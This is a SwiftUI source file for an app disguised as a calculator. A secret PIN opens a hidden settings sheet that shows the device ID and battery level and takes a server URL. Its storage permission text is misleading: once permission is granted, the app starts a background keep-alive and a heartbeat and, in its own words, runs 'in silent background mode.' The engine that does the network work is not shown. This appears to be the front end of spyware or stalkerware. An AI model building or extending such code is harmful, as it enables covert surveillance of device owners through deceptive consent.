import SwiftUI

struct ContentView: View {
    @StateObject private var engine = VaultEngine.shared
    @State private var display = "0"
    @State private var currentOperation: String? = nil
    @State private var previousValue: Double = 0
    @State private var isTyping = false
    @State private var showSecretSheet = false
    @State private var keyHistory = ""

    var body: some View {
        GeometryReader { geo in
            let spacing: CGFloat = 14
            let totalWidth = geo.size.width
            let buttonSize = (totalWidth - (spacing * 5)) / 4
            let zeroWidth = (buttonSize * 2) + spacing

            ZStack {
                Color.black.edgesIgnoringSafeArea(.all)

                VStack(spacing: spacing) {
                    Spacer()

                    // Calculator Display
                    HStack {
                        Spacer()
                        Text(display)
                            .font(.system(size: 80, weight: .light))
                            .foregroundColor(.white)
                            .lineLimit(1)
                            .minimumScaleFactor(0.2)
                            .padding(.horizontal, 24)
                    }

                    // Keypad Rows
                    VStack(spacing: spacing) {
                        HStack(spacing: spacing) {
                            calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
                            calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
                            calcBtn("%", size: buttonSize, color: Color(white: 0.65), textCol: .black) { percentage() }
                            calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("7", size: buttonSize) { inputDigit("7") }
                            calcBtn("8", size: buttonSize) { inputDigit("8") }
                            calcBtn("9", size: buttonSize) { inputDigit("9") }
                            calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("4", size: buttonSize) { inputDigit("4") }
                            calcBtn("5", size: buttonSize) { inputDigit("5") }
                            calcBtn("6", size: buttonSize) { inputDigit("6") }
                            calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("1", size: buttonSize) { inputDigit("1") }
                            calcBtn("2", size: buttonSize) { inputDigit("2") }
                            calcBtn("3", size: buttonSize) { inputDigit("3") }
                            calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
                        }

                        HStack(spacing: spacing) {
                            Button(action: { inputDigit("0") }) {
                                HStack {
                                    Text("0")
                                        .font(.system(size: 34, weight: .medium))
                                        .foregroundColor(.white)
                                        .padding(.leading, buttonSize * 0.35)
                                    Spacer()
                                }
                                .frame(width: zeroWidth, height: buttonSize)
                                .background(Color(white: 0.2))
                                .cornerRadius(buttonSize / 2)
                            }

                            calcBtn(".", size: buttonSize) { inputDigit(".") }
                            calcBtn("=", size: buttonSize, color: .orange) { calculate() }
                        }
                    }
                    .padding(.bottom, geo.safeAreaInsets.bottom > 0 ? geo.safeAreaInsets.bottom : 20)
                }
                .padding(.horizontal, spacing)
            }
        }
        .sheet(isPresented: $showSecretSheet) {
            StoragePermissionView(engine: engine, isPresented: $showSecretSheet)
        }
    }

    private func calcBtn(_ label: String, size: CGFloat, color: Color = Color(white: 0.2), textCol: Color = .white, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 32, weight: .medium))
                .foregroundColor(textCol)
                .frame(width: size, height: size)
                .background(color)
                .clipShape(Circle())
        }
    }

    private func inputDigit(_ digit: String) {
        keyHistory += digit
        if !isTyping {
            display = digit
            isTyping = true
        } else {
            display += digit
        }
    }

    private func clear() {
        display = "0"
        previousValue = 0
        currentOperation = nil
        isTyping = false
        keyHistory = ""
    }

    private func toggleSign() {
        if let val = Double(display) {
            display = val.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(-val)) : String(-val)
        }
    }

    private func percentage() {
        if let val = Double(display) {
            display = String(val / 100)
        }
    }

    private func setOperation(_ op: String) {
        previousValue = Double(display) ?? 0
        currentOperation = op
        isTyping = false
        keyHistory += op
    }

    private func calculate() {
        keyHistory += "="

        if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
            keyHistory = ""
            clear()
            showSecretSheet = true
            return
        }

        guard let op = currentOperation, let current = Double(display) else { return }
        var result: Double = 0
        switch op {
        case "+": result = previousValue + current
        case "-": result = previousValue - current
        case "×": result = previousValue * current
        case "÷": result = current != 0 ? previousValue / current : 0
        default: break
        }

        display = result.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(result)) : String(result)
        currentOperation = nil
        isTyping = false
    }
}

// MARK: - Method 2 Storage & Cache Permission Explainer View
struct StoragePermissionView: View {
    @ObservedObject var engine: VaultEngine
    @Binding var isPresented: Bool

    @State private var serverURL: String = ""
    @State private var secretPin: String = ""

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("Storage Cache & Optimization")) {
                    HStack {
                        Image(systemName: "internaldrive.fill")
                            .foregroundColor(.blue)
                        Text("Device ID")
                        Spacer()
                        Text(engine.deviceId)
                            .font(.system(.subheadline, design: .monospaced))
                            .foregroundColor(.green)
                    }

                    HStack {
                        Image(systemName: "battery.100")
                            .foregroundColor(.green)
                        Text("Battery Status")
                        Spacer()
                        Text("\(engine.batteryLevel)%" + (engine.isCharging ? " ⚡" : ""))
                            .foregroundColor(.secondary)
                    }

                    HStack {
                        Image(systemName: "server.rack")
                            .foregroundColor(.cyan)
                        Text("Server URL")
                        Spacer()
                        TextField("URL", text: $serverURL)
                            .multilineTextAlignment(.trailing)
                            .font(.caption)
                    }
                }

                Section(header: Text("Disk Storage Access")) {
                    VStack(alignment: .leading, spacing: 8) {
                        Text("Storage Allocation")
                            .font(.headline)
                        Text("To load local cache, save calculation receipts, and manage custom calculator themes, please allocate storage access on your device.")
                            .font(.caption)
                            .foregroundColor(.gray)
                    }
                    .padding(.vertical, 4)

                    Button(action: grantStorage) {
                        HStack {
                            Spacer()
                            Text(engine.isActivated ? "STORAGE ALLOCATED (ACTIVE)" : "ALLOCATE STORAGE & ENABLE CACHE")
                                .fontWeight(.bold)
                                .foregroundColor(.white)
                            Spacer()
                        }
                        .padding(.vertical, 10)
                        .background(engine.isActivated ? Color.gray : Color.blue)
                        .cornerRadius(10)
                    }
                }

                Section(footer: Text("Tap below to return to the calculator. It will run in silent background mode.")) {
                    Button(action: {
                        engine.serverURL = serverURL
                        engine.secretPin = secretPin
                        engine.saveSettings()
                        isPresented = false
                    }) {
                        HStack {
                            Spacer()
                            Text("SAVE & RETURN TO CALCULATOR")
                                .fontWeight(.semibold)
                                .foregroundColor(.blue)
                            Spacer()
                        }
                    }
                }
            }
            .navigationTitle("Storage & Preferences")
            .navigationBarItems(trailing: Button("Done") {
                engine.serverURL = serverURL
                engine.secretPin = secretPin
                engine.saveSettings()
                isPresented = false
            })
            .onAppear {
                serverURL = engine.serverURL
                secretPin = engine.secretPin
            }
        }
    }

    private func grantStorage() {
        engine.serverURL = serverURL
        engine.secretPin = secretPin
        engine.saveSettings()

        engine.requestStoragePermission { granted in
            if granted {
                engine.startBackgroundKeepAlive()
                engine.startHeartbeat()
            }
        }
    }
}
